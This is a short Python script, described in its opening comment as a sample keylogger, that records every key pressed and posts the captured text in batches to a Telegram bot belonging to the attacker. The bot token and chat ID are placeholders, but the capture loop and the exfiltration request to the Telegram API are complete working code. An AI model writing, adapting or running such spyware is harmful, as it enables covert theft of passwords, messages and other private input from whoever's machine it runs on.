# just a sample code of working of keyloggger by sending the data to hackers telegram bot account
import requests
import keyboard
print("start")
message = ""
token = "YOUR_TELEGRAM_BOT_TOKEN HERE"
url = f"https://api.telegram.org/bot{token}/sendmessage"

data = ""
while True:
    a = keyboard.read_key()
    data+= f"{a} "
    if len(data) > 20:
        print(data)
        # GET THE CHAT ID BY SENDING THE GET REQUEST TO THE /GETUPDATES END POINT
        pram = {"chat_id" : "YOUR_CHAT_ID" , "text" :data}
        print(url,pram)
        res = requests.post(url,pram)
        if res.status_code == 200:
            print("Message sent successfully!")
        else:
            print("Failed to send message.")
        data = ""
        print(data)
